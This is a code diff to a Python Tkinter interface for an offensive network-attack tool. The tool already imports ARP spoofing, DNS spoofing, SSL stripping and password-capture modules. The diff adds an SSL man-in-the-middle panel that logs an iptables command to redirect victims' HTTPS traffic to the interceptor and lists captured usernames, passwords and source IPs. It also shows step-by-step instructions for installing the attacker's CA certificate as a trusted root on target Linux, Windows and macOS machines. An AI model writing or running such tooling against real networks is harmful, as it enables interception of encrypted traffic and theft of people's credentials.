@@ -18,6 +18,7 @@ from attacks.arp_spoof import ARPSpoofer
 from attacks.dns_spoof import DNSSpoofer
 from attacks.ssl_strip import SSLStripper
 from attacks.password_capture import PasswordCapture
+from attacks.ssl_mitm import SSLMitm
 
 class MainWindow:
     def __init__(self, root):
@@ -31,6 +32,7 @@ class MainWindow:
         self.dns_spoofer = None
         self.ssl_stripper = None
         self.password_capture = PasswordCapture()
+        self.ssl_mitm = None
         
         # 建立介面
         self._create_widgets()
@@ -143,6 +145,26 @@ class MainWindow:
         self.ssl_stop_btn = ttk.Button(ssl_frame, text="停止SSL剝離", 
                                        command=self._stop_ssl_strip, state=tk.DISABLED)
         self.ssl_stop_btn.grid(row=0, column=1, padx=5, pady=5)
+        
+        # SSL中間人（CA證書）
+        ssl_mitm_frame = ttk.LabelFrame(self.attack_frame, text="SSL中間人 (CA證書)")
+        ssl_mitm_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Label(ssl_mitm_frame, text="監聽端口:").grid(row=0, column=0, padx=5, pady=5)
+        self.mitm_port = ttk.Entry(ssl_mitm_frame, width=10)
+        self.mitm_port.insert(0, "8443")
+        self.mitm_port.grid(row=0, column=1, padx=5, pady=5)
+        
+        self.mitm_start_btn = ttk.Button(ssl_mitm_frame, text="開始SSL中間人", 
+                                         command=self._start_ssl_mitm)
+        self.mitm_start_btn.grid(row=0, column=2, padx=5, pady=5)
+        
+        self.mitm_stop_btn = ttk.Button(ssl_mitm_frame, text="停止SSL中間人", 
+                                        command=self._stop_ssl_mitm, state=tk.DISABLED)
+        self.mitm_stop_btn.grid(row=0, column=3, padx=5, pady=5)
+        
+        ttk.Button(ssl_mitm_frame, text="顯示CA證書", 
+                  command=self._show_ca_cert).grid(row=0, column=4, padx=5, pady=5)
         
         # 密碼捕獲
         pwd_frame = ttk.LabelFrame(self.attack_frame, text="密碼捕獲")
@@ -289,6 +311,60 @@ class MainWindow:
         for pwd in passwords:
             self.cred_text.insert(tk.END, 
                 f"類型: {pwd['type']}, 使用者名稱: {pwd['username']}, 密碼: {pwd['password']}\\n")
+    
+    def _start_ssl_mitm(self):
+        """開始SSL中間人攻擊"""
+        try:
+            port = int(self.mitm_port.get())
+        except ValueError:
+            messagebox.showerror("錯誤", "請輸入有效的端口號")
+            return
+        
+        self.ssl_mitm = SSLMitm(port=port)
+        
+        def start_mitm():
+            if self.ssl_mitm.start():
+                self.mitm_start_btn.config(state=tk.DISABLED)
+                self.mitm_stop_btn.config(state=tk.NORMAL)
+                self._log(f"[+] SSL中間人已啟動 (端口: {port})")
+                self._log(f"[*] CA證書位置: {self.ssl_mitm.get_ca_cert_path()}")
+                self._log("[*] 請配置iptables將HTTPS流量重定向到此端口")
+                self._log(f"[*] 命令: sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port {port}")
+        
+        threading.Thread(target=start_mitm, daemon=True).start()
+    
+    def _stop_ssl_mitm(self):
+        """停止SSL中間人攻擊"""
+        if self.ssl_mitm:
+            self.ssl_mitm.stop()
+            self.mitm_start_btn.config(state=tk.NORMAL)
+            self.mitm_stop_btn.config(state=tk.DISABLED)
+            self._log("[+] SSL中間人已停止")
+            
+            # 顯示捕獲的憑證
+            creds = self.ssl_mitm.get_captured_credentials()
+            self.cred_text.delete(1.0, tk.END)
+            for cred in creds:
+                self.cred_text.insert(tk.END, 
+                    f"使用者名稱: {cred['username']}, 密碼: {cred['password']} (來源: {cred['source_ip']})\\n")
+    
+    def _show_ca_cert(self):
+        """顯示CA證書資訊"""
+        if not self.ssl_mitm:
+            self.ssl_mitm = SSLMitm()
+        
+        cert_path = self.ssl_mitm.get_ca_cert_path()
+        if os.path.exists(cert_path):
+            message = f"CA證書位置: {cert_path}\\n\\n"
+            message += "要安裝CA證書到目標系統:\\n"
+            message += "1. 將證書複製到目標系統\\n"
+            message += "2. 在Linux上: sudo cp ca_cert.pem /usr/local/share/ca-certificates/mitm-ca.crt\\n"
+            message += "   sudo update-ca-certificates\\n"
+            message += "3. 在Windows上: 雙擊證書文件，選擇'安裝證書'，選擇'受信任的根證書頒發機構'\\n"
+            message += "4. 在macOS上: 雙擊證書文件，在鑰匙串中標記為'始終信任'"
+            messagebox.showinfo("CA證書資訊", message)
+        else:
+            messagebox.showinfo("CA證書", "CA證書尚未創建，請先啟動SSL中間人功能")
     
 def main():
     root = tk.Tk()
